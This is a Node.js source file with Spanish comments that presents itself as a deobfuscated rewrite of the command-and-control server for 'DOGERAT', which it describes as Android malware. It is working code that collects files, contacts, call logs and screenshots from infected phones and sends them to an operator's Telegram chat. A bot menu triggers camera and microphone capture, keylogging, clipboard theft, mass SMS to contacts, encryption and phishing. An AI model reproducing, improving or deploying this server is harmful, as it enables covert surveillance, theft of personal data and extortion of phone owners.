// Servidor C2 Desofuscado (Fiel a la Estructura Original)
// Este código sigue la lógica y el flujo del script ofuscado proporcionado,
// pero utiliza nombres de variables y funciones legibles y comentarios extensos.

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
// Nota: El paquete original para telegram bot no se especificó, asumimos el estándar.
const TelegramBot = require('node-telegram-bot-api'); 
const https = require('https'); // Requerido pero no usado en el flujo principal del código original.
const multer = require('multer');
const fs = require('fs');

// --- Inicialización y Configuración ---

// 1. Cargar configuración desde el archivo local (como en el código original)
// DEBE CREARSE UN ARCHIVO data.json con el 'token' y el 'id'
let data = { token: "", id: "" };
try {
    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (e) {
    console.error("ERROR: No se pudo leer o parsear './data.json'. Asegúrate de que el archivo existe y es válido.");
    process.exit(1);
}

const PORT = process.env.PORT || 3000;

const app = express();
const server = http.createServer(app);
// 2. Inicialización de Socket.IO
// Usamos la configuración por defecto, asumiendo que el código original funcionaba con ella.
const io = new Server(server); 

// 3. Inicialización del Bot de Telegram
const bot = new TelegramBot(data.token, {
    'polling': true,
    'request': {}
});

// 4. Configuración de Multer para la carga de archivos
const uploader = multer(); // El código original usa la memoria temporal (buffer)
const FILE_UPLOAD_DIR = 'file'; // Constante para la ruta de Multer, como en el original.

// 5. Estado del Sistema (Maps) - Usado para rastrear el flujo de conversación del bot
const appData = new Map();

// --- Rutas HTTP de Express ---

// Ruta para la carga de archivos (ej: screenshots, audio)
app.post('/upload', uploader.single('file'), (req, res) => {
    // Las apps clientes usan 'currentTarget' en los headers
    const deviceId = req.headers['currentTarget']; 
    // Los datos del archivo vienen en req.file (gracias a Multer)
    const fileName = req.file.originalname;
    const fileBuffer = req.file.buffer;

    // Simular búsqueda del modelo del dispositivo (El código ofuscado lo hacía de forma más compleja)
    const deviceModel = deviceId || "Dispositivo Desconocido"; 

    // Enviar el archivo a Telegram
    bot.sendDocument(data.id, fileBuffer, {
        'caption': `<b>✯ Archivo Recibido desde → ${deviceModel}</b>`,
        'parse_mode': 'HTML'
    }, {
        'filename': fileName,
        'contentType': '*/*' // Tipo MIME genérico, como en el original
    });

    res.send('Done');
});

// Ruta para el manejo de logs y texto (ej: contactos, historial de llamadas)
app.post('/text', (req, res) => {
    // El cliente envía texto en el cuerpo de la petición.
    const receivedText = req.body.text; 
    const deviceId = req.headers['currentTarget'];
    const deviceModel = deviceId || "Dispositivo Desconocido";
    
    // Enviar el mensaje a Telegram
    bot.sendMessage(data.id, 
        `<b>✯ Mensaje recibido de → ${deviceModel}</b>\n\nMensaje → </b>${receivedText}`, 
        { 
            'parse_mode': 'HTML' 
        }
    );

    res.send('Done');
});

// Ruta de "Inicio" que devuelve el contenido de la configuración (inusual, pero fiel al original)
// Nota: El código original hace un app.get('/start', ...) que parece ser un error o una ruta no usada.
app.get('/start', (req, res) => {
    // El código original respondía con data.host. Se asume que es una URL o mensaje.
    res.send('Servidor C2 en funcionamiento.'); 
});

// --- Lógica de Socket.IO (Conexiones de Dispositivos) ---

io.on('connection', socket => {
    // Obtener información del handshake, como hacía el original
    const handshakeHeaders = socket.handshake.headers;
    const deviceId = handshakeHeaders['currentTarget'] || 'no information';
    const model = handshakeHeaders['model'] || 'no information';
    const version = handshakeHeaders['version'] || 'no information';
    const ip = handshakeHeaders['host'] || 'no information';
    
    // Asignar propiedades al socket
    socket.id = deviceId; // El código original usa el ID del dispositivo como ID del socket
    socket.model = model;
    
    // Mensaje de nueva conexión (Fiel al texto original)
    let connectionMessage = 
        `<b>✯ Nuevo dispositivo conectado</b>\n\n` +
        `<b>modelo</b> → ${model}\n` +
        `<b>ip</b> → ${ip}\n` +
        `<b>versión</b> → ${version}\n` +
        `<b>tiempo</b> → ${new Date().toLocaleString()}\n\n`;

    bot.sendMessage(data.id, connectionMessage, {
        'parse_mode': 'HTML'
    });

    // Evento de desconexión
    socket.on('disconnect', () => {
        let disconnectMessage = 
            `<b>✯ Dispositivo desconectado</b>\n\n` +
            `<b>modelo</b> → ${socket.model}\n` +
            `<b>ip</b> → ${ip}\n` +
            `<b>versión</b> → ${version}\n` +
            `<b>tiempo</b> → ${new Date().toLocaleString()}\n\n`;

        bot.sendMessage(data.id, disconnectMessage, {
            'parse_mode': 'HTML'
        });
    });

    // Evento para respuestas del cliente Android
    socket.on('commend', responseData => {
        // Enviar la respuesta del dispositivo al chat de Telegram
        bot.sendMessage(data.id, 
            `<b>✯ Mensaje recibido de → ${socket.id}</b>\n\nMensaje → </b>${responseData}`, 
            { 'parse_mode': 'HTML' }
        );
    });
});


// --- Lógica del Bot de Telegram ---

bot.on('message', async msg => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Solo procesar mensajes de la ID configurada
    if (String(chatId) !== String(data.id) || !text) return;

    // Acciones y constantes extraídas del original
    const DEVICE_SELECTION_MENU = [
        ['✯ Dispositivos ✯', '✯ Acción ✯'],
        ['✯ About us ✯']
    ];
    const MAIN_MENU_KEYBOARD = {
        keyboard: DEVICE_SELECTION_MENU,
        resize_keyboard: true
    };
    const ALL_DEVICES_ID = 'all'; 

    // Variables de estado del chat (extraídas del Map appData)
    const currentAction = appData.get(chatId) ? appData.get(chatId).action : null;
    const currentTargetId = appData.get(chatId) ? appData.get(chatId).target : null;
    
    // --- Fun: Enviar Comando a Dispositivo(s) ---
    const sendCommand = (targetId, request, extras = []) => {
        const payload = { request: request, extras: extras };
        
        if (targetId === ALL_DEVICES_ID) {
            // Enviar a todos los sockets conectados
            io.sockets.emit('commend', payload); 
        } else {
            // Enviar a un socket específico
            io.to(targetId).emit('commend', payload);
        }

        bot.sendMessage(chatId, 
            '<b>✯ La solicitud fue ejecutada exitosamente, recibirá la respuesta del dispositivo pronto...</b>\n\n✯ Volver al menú principal', 
            { 
                'parse_mode': 'HTML', 
                'reply_markup': MAIN_MENU_KEYBOARD
            }
        );
        appData.delete(chatId); // Limpiar estado después de enviar
    };

    // --- MANEJO DE MENÚ PRINCIPAL Y START ---

    if (text === '/start' || text === '✯ Back to main menu ✯' || text === '✯ Cancel action ✯') {
        appData.delete(chatId); // Limpiar cualquier estado anterior
        bot.sendMessage(chatId, 
            `<b>✯ Bienvenido a DOGERAT</b>\n\n<b>✯ Dispositivos conectados: ${io.sockets.size}</b>`, 
            { 
                'parse_mode': 'HTML',
                'reply_markup': MAIN_MENU_KEYBOARD
            }
        );
        return;
    }

    // --- MENÚS DE NAVEGACIÓN ---

    if (text === '✯ Dispositivos ✯') {
        const availableDevices = Array.from(io.sockets.sockets.values());

        if (availableDevices.length === 0) {
            return bot.sendMessage(chatId, '<b>✯ No hay dispositivos conectados</b>\n\n', { parse_mode: 'HTML' });
        }

        const keyboard = availableDevices.map(socket => [socket.model || socket.id]);
        keyboard.push(['✯ All ✯']);
        keyboard.push(['✯ Back to main menu ✯']);

        bot.sendMessage(chatId, '<b>✯ Selecciona dispositivo para realizar acción</b>\n\n', {
            parse_mode: 'HTML',
            reply_markup: { keyboard: keyboard, resize_keyboard: true }
        });
        return;
    }

    if (text === '✯ Acción ✯') {
        const actionKeyboard = [
            ['✯ Screenshot ✯', '✯ Microphone ✯', '✯ Clipboard ✯', '✯ Calls ✯', '✯ Contacts ✯', '✯ Apps ✯'],
            ['✯ File explorer ✯', '✯ Gallery ✯', '✯ Main camera ✯', '✯ Selfie Camera ✯'],
            ['✯ Vibrate ✯', '✯ Toast ✯', '✯ Pop notification ✯', '✯ Open URL ✯'],
            ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
            ['✯ Send SMS ✯', '✯ SMS to all contacts ✯'],
            ['✯ Encrypt ✯', '✯ Decrypt ✯', '✯ Phishing ✯'],
            ['✯ Back to main menu ✯']
        ];
        bot.sendMessage(chatId, '<b>✯ Selecciona acción para realizar para el dispositivo</b>\n\n', {
            parse_mode: 'HTML',
            reply_markup: { keyboard: actionKeyboard, resize_keyboard: true }
        });
        return;
    }

    if (text === '✯ About us ✯') {
        const aboutText = 
            `DOGERAT es un malware para controlar dispositivos Android.\n` +
            `Cualquier mal uso es responsabilidad de la persona!\n\n` +
            `Desarrollado por: @CYBERSHIELDX\n` +
            `Telegram → @CUBERSHIELDX\n` +
            `ADMIN → @SPHANTER`;
        return bot.sendMessage(chatId, aboutText, { parse_mode: 'HTML' });
    }

    // --- LÓGICA DE SELECCIÓN DE DISPOSITIVO ---

    const allSockets = Array.from(io.sockets.sockets.values());
    const selectedSocket = allSockets.find(s => s.model === text || s.id === text);
    const targetId = (text === '✯ All ✯') ? ALL_DEVICES_ID : (selectedSocket ? selectedSocket.id : null);

    if (targetId) {
        // Almacenar el target y pedir la acción
        appData.set(chatId, { target: targetId, action: 'await_command' });
        const deviceName = targetId === ALL_DEVICES_ID ? 'todos los dispositivos' : selectedSocket.model;
        
        const actionKeyboard = [
            ['✯ Screenshot ✯', '✯ Microphone ✯', '✯ Clipboard ✯', '✯ Calls ✯', '✯ Contacts ✯', '✯ Apps ✯'],
            ['✯ File explorer ✯', '✯ Gallery ✯', '✯ Main camera ✯', '✯ Selfie Camera ✯'],
            ['✯ Vibrate ✯', '✯ Toast ✯', '✯ Pop notification ✯', '✯ Open URL ✯'],
            ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
            ['✯ Send SMS ✯', '✯ SMS to all contacts ✯'],
            ['✯ Encrypt ✯', '✯ Decrypt ✯', '✯ Phishing ✯'],
            ['✯ Back to main menu ✯']
        ];

        return bot.sendMessage(chatId, 
            `<b>✯ Selecciona acción para realizar para ${deviceName}</b>\n\n`, 
            { 
                parse_mode: 'HTML',
                reply_markup: { keyboard: actionKeyboard, resize_keyboard: true }
            }
        );
    }
    
    // --- LÓGICA DE FLUJO DE ACCIONES INTERACTIVAS (INPUTS) ---

    // 1. Manejo de comandos que requieren un TARGET, pero no INPUT adicional
    if (currentAction === 'await_command' && currentTargetId) {
        let requestCommand = null;
        let extras = [];

        switch (text) {
            case '✯ Screenshot ✯': requestCommand = 'screenshot'; break;
            case '✯ Microphone ✯': 
                appData.set(chatId, { target: currentTargetId, action: 'await_mic_duration' });
                return bot.sendMessage(chatId, '<b>✯ Ingresa la duración de la grabación del micrófono en segundos</b>\n\n', { parse_mode: 'HTML' });
            case '✯ Clipboard ✯': requestCommand = 'clipboard'; break;
            case '✯ Calls ✯': requestCommand = 'calls'; break;
            case '✯ Contacts ✯': requestCommand = 'contacts'; break;
            case '✯ Apps ✯': requestCommand = 'apps'; break;
            case '✯ File explorer ✯': requestCommand = 'file-explorer'; break;
            case '✯ Gallery ✯': requestCommand = 'gallery'; break;
            case '✯ Main camera ✯': requestCommand = 'main-camera'; break;
            case '✯ Selfie Camera ✯': requestCommand = 'selfie-camera'; break;
            case '✯ Keylogger ON ✯': requestCommand = 'keylogger-on'; break;
            case '✯ Keylogger OFF ✯': requestCommand = 'keylogger-off'; break;
            case '✯ Vibrate ✯': 
                appData.set(chatId, { target: currentTargetId, action: 'await_vibrate_duration' });
                return bot.sendMessage(chatId, '<b>✯ Ingresa la duración que quieres que el dispositivo vibre en segundos</b>\n\n', { parse_mode: 'HTML' });
            case '✯ Toast ✯': 
                appData.set(chatId, { target: currentTargetId, action: 'await_toast_text' });
                return bot.sendMessage(chatId, '<b>✯ Ingresa un mensaje que quieres que aparezca en el cuadro de notificación (Toast)</b>\n\n', { parse_mode: 'HTML' });
            case '✯ Pop notification ✯': 
                appData.set(chatId, { target: currentTargetId, action: 'await_notification_text' });
                return bot.sendMessage(chatId, '<b>✯ Ingresa texto que quieres que aparezca como notificación</b>\n\n', { parse_mode: 'HTML' });
            case '✯ Open URL ✯': 
                appData.set(chatId, { target: currentTargetId, action: 'await_url' });
                return bot.sendMessage(chatId, '<b>✯ Ingresa la URL que quieres abrir</b>\n\n', { parse_mode: 'HTML' });
            case '✯ Encrypt ✯': 
                requestCommand = 'encrypt'; // Comando simple en el original
                break;
            case '✯ Decrypt ✯': 
                requestCommand = 'decrypt'; // Comando simple en el original
                break;
            case '✯ Phishing ✯': 
                return bot.sendMessage(chatId, '<b>✯ Esta opción solo está disponible en la versión premium dm to buy @sphanter</b>\n\n', { parse_mode: 'HTML' });
            case '✯ Send SMS ✯': 
                appData.set(chatId, { target: currentTargetId, action: 'await_sms_number' });
                return bot.sendMessage(chatId, '<b>✯ Ingresa un número de teléfono al que quieres enviar SMS</b>\n\n', { parse_mode: 'HTML' });
            case '✯ SMS to all contacts ✯': 
                appData.set(chatId, { target: currentTargetId, action: 'await_sms_all_text' });
                return bot.sendMessage(chatId, '<b>✯ Ingresa texto que quieres enviar a todos los contactos</b>\n\n', { parse_mode: 'HTML' });
            default:
                // Si es cualquier otro texto, volvemos al menú principal
                return bot.sendMessage(chatId, 'Comando no reconocido o acción inválida.', { reply_markup: MAIN_MENU_KEYBOARD });
        }
        
        if (requestCommand) {
            sendCommand(currentTargetId, requestCommand, extras);
        }
        return;
    }
    
    // 2. Manejo de INPUTS después de la solicitud inicial

    if (currentAction === 'await_mic_duration' && !isNaN(text)) {
        sendCommand(currentTargetId, 'microphone', [{ key: 'duration', value: text }]);
    } 
    else if (currentAction === 'await_vibrate_duration' && !isNaN(text)) {
        sendCommand(currentTargetId, 'vibrate', [{ key: 'duration', value: text }]);
    } 
    else if (currentAction === 'await_toast_text') {
        sendCommand(currentTargetId, 'toast', [{ key: 'toastText', value: text }]);
    }
    else if (currentAction === 'await_notification_text') {
        sendCommand(currentTargetId, 'popNotification', [{ key: 'notificationText', value: text }]);
    }
    else if (currentAction === 'await_url') {
        sendCommand(currentTargetId, 'url', [{ key: 'url', value: text }]);
    }
    else if (currentAction === 'await_sms_number') {
        // Almacenar el número y cambiar de estado para pedir el texto
        appData.set(chatId, { target: currentTargetId, action: 'await_sms_text', number: text });
        bot.sendMessage(chatId, `<b>✯ Ahora ingresa un mensaje que quieres enviar a ${text}</b>\n\n`, { parse_mode: 'HTML' });
    }
    else if (currentAction === 'await_sms_text') {
        const numberToSend = appData.get(chatId).number;
        sendCommand(currentTargetId, 'sendSms', [
            { key: 'smsNumber', value: numberToSend },
            { key: 'smsText', value: text }
        ]);
    }
    else if (currentAction === 'await_sms_all_text') {
        sendCommand(currentTargetId, 'smsToAllContacts', [{ key: 'smsText', value: text }]);
    } 
    
    else if (currentAction) {
        // Si hay una acción en curso pero el input no es válido
        bot.sendMessage(chatId, 'Entrada inválida. Cancela con "✯ Cancel action ✯" o intenta de nuevo.', { parse_mode: 'HTML' });
    }
});

// --- Iniciar Servidor ---
server.listen(PORT, () => {
    console.log(`[INFO] Servidor escuchando en el puerto ${PORT}`);
    // Opcional: Mostrar mensaje inicial para verificar el token
    bot.sendMessage(data.id, 
        `[INFO] Servidor C2 iniciado y escuchando en ${PORT}.\n` +
        `ID del Chat: ${data.id}\n` +
        `Dispositivos conectados: ${io.sockets.size}`,
        { parse_mode: 'HTML' }
    ).catch(e => console.error("ERROR: No se pudo enviar el mensaje inicial a Telegram. Revisa el token y la ID de chat.", e));
});
